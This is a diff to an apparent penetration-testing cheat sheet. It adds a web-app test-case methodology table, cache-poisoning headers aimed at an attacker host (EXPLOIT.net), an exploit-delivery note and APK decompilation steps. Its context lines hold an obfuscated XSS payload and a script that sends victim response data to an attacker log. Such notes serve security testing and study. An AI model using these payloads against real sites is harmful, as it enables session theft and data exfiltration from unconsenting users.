@@ -252,6 +252,1396 @@ Project options > Sessions > Session Handling Rules > Add
 2. Test every request, map every parameter in request with function to be clearer
 3. Review overall: spend rest of time try to RCE (if not yet)
 4. Report
+
+<table>
+    <tr>
+        <td>&quot;ID&quot;</td>
+        <td>Complexity</td>
+        <td>Test Case / Step</td>
+        <td>Test Description</td>
+    </tr>
+    <tr>
+        <td>WEB-01</td>
+        <td>Low</td>
+        <td>Understanding the web application</td>
+        <td>Objective: To understand how the web application works and to identify the possible attack pathways.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities:</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify what is the web application used for.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify if the web application is internal facing or internet facing.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify who are the end users of the web application and what are the roles available in the web application.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify any critical functionalities.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Full understanding of how the web application works, interesting critical functionalities which could be vulnerable and plan the test cases accordingly.</td>
+    </tr>
+    <tr>
+        <td>WEB-02</td>
+        <td>Low</td>
+        <td>Run discovery scans and port scans across the in-scope hosts.</td>
+        <td>Objective: To identify open ports, running services, possible vulnerable software/libraries and to identify the supported protocol, ciphers and certificate.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use enterprise tools such as Nessus or Qualys to run unauthenticated and authenticated scans against the in-scope hosts.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use port scanning tools such as Nmap or telnet to scan and identify open ports and software against the in-scope hosts.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use SSL/TLS scanning tools such as SSLScan, SSLyze or OpenSSL to determine the supported protocols, ciphers and certificate in use by the application.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Vulnerable software will be identified in the scan results. Open ports and service banners will be outlined in the scan results. Supported weak ciphers, protocols and digital certificate will be identified.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>References: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td>WEB-03</td>
+        <td>Low</td>
+        <td>Brute force the web server to enumerate directories and files.</td>
+        <td>Objective: To discover the web application sitemap, sensitive files that may contain version information or credentials and endpoints that may host different services as well as administrative interfaces.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Perform spidering and fuzzing using wordlists.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Using wayback machine to detect some old folders/APIs that could be access to get hidden data.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Administrative interfaces, backups, unreferenced files and sensitive files will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>References:</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>GitHub - gmelodie/awesome-wordlists: A curated list wordlists for bruteforcing and fuzzing</td>
+    </tr>
+    <tr>
+        <td>WEB-04</td>
+        <td>Medium</td>
+        <td>Identify any vulnerabilities associated with the application’s authentication mechanism.</td>
+        <td>Objective: To determine if it is possible for an unauthenticated user to access pages and perform actions intended to be restricted to authenticated and authorised users. .</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify the authentication method in use by the application.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Attempt to login to the application using default or well-known credentials.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Enumerate valid and invalid users through the descriptive error messages on the login page, password reset/forgot password page, registration page and username verification page.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Review the application’s password policy and account lockout threshold.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Access authenticated pages without logging in.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Bypass 2FA implementations.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Identification of authentication related vulnerabilities will be flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-05</td>
+        <td>Medium</td>
+        <td>Identify any vulnerabilities associated with the application’s session management.</td>
+        <td>Objective: Identify possible session management issues such as session fixation, improper session termination, session timeout, concurrent sessions and more.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Access the application in three different sessions to verify if the application supports concurrent session.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check if a new session cookie is issued is after authentication to verify if the application is affected with session fixation vulnerability.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify the application’s session expiration.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check if the session is terminated and invalidated on the server-side after the user invokes the log out functionality.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Identify if session cookies are transmitted in URL.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check for the session identifier entropy.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Inspect if the session cookie is stored in local storage.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Verify that the application implements a logout functionality and is clearly visible.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Analyze the JS bundle and obtain post-authenticated APIs to call using an invalid token/session to check the authentication is applied or not.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Identification of session management related vulnerabilities will be flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-06</td>
+        <td>High</td>
+        <td>Identify potential vulnerable injection points for client-side attacks.</td>
+        <td>Objective: To determine if the application lacks sufficient input validation for any user-supplied input and allows client-side (Cross Site Scripting, HTML Injection, CSS Injection, Open Redirection, CSRF, Host Header Injection) execution of untrusted payloads.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use fuzzing tool to inject payloads into comment boxes, forms and parameters values which accept user input.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Manually test and inject malicious payload into the parameters and observe the behaviour to find client-side vulnerabilities.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Untrusted user supplied payload executed on the client-side (end user) when injected to vulnerable injection point will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-07</td>
+        <td>High</td>
+        <td>Identify potential vulnerable injection points for server-side attacks.</td>
+        <td>Objective: To determine if the application lacks sufficient input validation for user-supplied input and allows server-side (Remote Code Execution, SQL Injection, Server-Side Request Forgery, Template Injection, Deserialization, LDAP Injection, XML Injection, Directory Traversal) execution of untrusted payloads.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use fuzzing tool to inject payloads into comment boxes, forms and parameters values which accept user input.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Manually test and inject malicious payload into the parameters and observe the behaviour to find server-side vulnerabilities.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Untrusted user supplied payload executed on the backend when injected to vulnerable injection point will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-08</td>
+        <td>Medium</td>
+        <td>Identify any vulnerabilities associated with the application’s access controls and authorisation controls.</td>
+        <td>Objective: To determine if it is possible for an unauthorised user to perform functions intended to be restricted to authorised users and obtain horizontal or vertical privilege escalation.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Invoke requests to the same endpoints with the authentication token of an authorised user and as an unauthorised user and determine if access controls are in place to prevent unauthorised user access to pages intended for authorised users.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use open-source intelligence gathering, manual enumeration and directory brute forcing tools to discover web pages that cannot be browsed to directly from the application user interface but can be accessed if you know the exact location.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Attempt to bypass maker-checker implementation.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Identification of potential horizontal and vertical privilege escalation vulnerabilities will be flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-09</td>
+        <td>Medium</td>
+        <td>Identify if the application accepts all file types in file upload functionality.</td>
+        <td>Objective: To determine if the application accepts unrestricted file upload which can be used in client-side or server-side attacks.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Upload various file types to determine what kind of files the application allows for upload and to determine if there are any input validation checks in place to validate the file type and content.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Upload a test file (EICAR) to verify if EDR solutions are in place on the server.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Try to download the uploaded files and verify if authentication and authorisation checks are in place. </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Circumvent file upload validation (file extension, content-type, filename).</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: File upload controls can be bypassed allowing the file upload functionality to be abused and compromise the server as well as other end users.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>References: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Download Anti Malware Testfile – Eicar</td>
+    </tr>
+    <tr>
+        <td>WEB-10</td>
+        <td>Medium</td>
+        <td>Identify if business logic controls are properly configured and implemented.</td>
+        <td>Objective: To determine if the application&#39;s business logic can be abused to manipulate legitimate functionality to achieve a malicious goal.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>For transactional applications, try to transfer negative amount or amount larger than the balance.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check if client-side controls are also validated on server-side.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Circumvent predefined workflows consisting of a sequence of expected steps.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Flaws in the business logic to circumvent the expected workflow of the application will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-11</td>
+        <td>Low</td>
+        <td>Identify how the application error conditions are being handled.</td>
+        <td>Objective: To determine if the application discloses any sensitive information due to overly verbose error messages.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Invoke requests with special characters in the URL.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Invoke requests with special characters in the request body, parameter and value.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Invoke requests for non-existent directories and files.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Overly verbose error messages displayed by the application will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-12</td>
+        <td>Low</td>
+        <td>Inspect if HTTP Security headers are implemented.</td>
+        <td>Objective: To determine if the application includes HTTP security headers in the response and sets appropriate values.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Use a spidering tool or an intercepting proxy to inspect if all responses include HTTP security headers.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>HTTP Strict Transport Security (HSTS)</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>X-FRAME</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Cache Control</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Content Security Policy (CSP)</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>X-XSS-Protection</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>X-Content-Type-Options</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Cross-Origin Resource Sharing (CORS)</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Application pages missing any of the security HTTP headers in the response are identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-13</td>
+        <td>Low</td>
+        <td>Test if the web server supports and allows dangerous HTTP methods.</td>
+        <td>Objective: To determine the dangerous HTTP methods supported by the application. </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Invoke the requests with different HTTP methods. </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>TRACE</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>PUT</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>DELETE</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Supported dangerous HTTP methods will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-14</td>
+        <td>Low</td>
+        <td>Inspect if the session cookies attributes are correctly implemented.</td>
+        <td>Objective: To determine if the session cookies generated for authenticated users are protected. </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities: </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Inspect the attributes of all session cookies used by the application.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Secure</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>HTTPOnly</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>SameSite</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Missing attributes that make a session cookie secure and protects the authenticated user’s session will be identified and flagged.</td>
+    </tr>
+    <tr>
+        <td>WEB-15</td>
+        <td>Medium</td>
+        <td>Other Test Cases</td>
+        <td>Objective: To determine other custom findings or think-out-the-box findings.  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Activities:  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check if the website is vulnerable to some de-sync attacks such as: Web Cache Poisoning, Web Cache Deception, HTTP Smuggling, etc.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Check if the website is vulnerable to Race Condition for some critical functions such as transfer money, receive reward points, etc.</td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>  </td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td></td>
+        <td></td>
+        <td>Expected Outcomes: Some custom findings will be identified and flagged.</td>
+    </tr>
+</table>
+
 </code></pre></div></div>
 <h3 id="multiple-request-csrf">CSRF</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Multiple requests CSRF
@@ -431,6 +1821,11 @@ x&quot;&gt;&lt;svg%250donload%3D&quot;window%5B%27alert%27%5D(location[%27hostna
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Web cache poisoning
 ##Detect
 	- Change host header to attacker's hostname
+		(if can not change directly: add these headers to the request
+			X-Forwarded-Host: EXPLOIT.net
+			X-Host: EXPLOIT.net
+			X-Forwarded-Server: EXPLOIT.net
+		)
 	- Check if the hostname reflected in response, ie: 
 		&lt;script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js">&lt;/script>
 		(and X-Cache: miss)
@@ -537,6 +1932,8 @@ Content-Length: 52<br><br>
         location=&#39;/log?key=&#39;+this.responseText;
     };
 &lt;/script&gt;
+
+###>Deliver exploit to victim > check access log
 </code></pre></div></div>
 
 <h3 id="websocket">WebSocket</h3>
@@ -612,6 +2009,18 @@ https://github.com/RUB-NDS/PRET
 #View log:
 	adb logcat
 </code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#RE .apk (pentesterlab)
+unzip demo.apk
+./dex2jar-2.0/d2j-dexjar.sh classes.dex
+unzip classes-dex2jar.jar (-> get .class file)
+
+jad ./com/pentesterlab/demo/MainActivity.class (-> MainActivity.jad -> change file to .java then can modify code, compile and run) 
+#cp Main.jad Main.java
+#javac Main.java
+#java Main
+</code></pre></div></div>
+
 <h4 id="mobile-pentest-process">Process</h4>	  
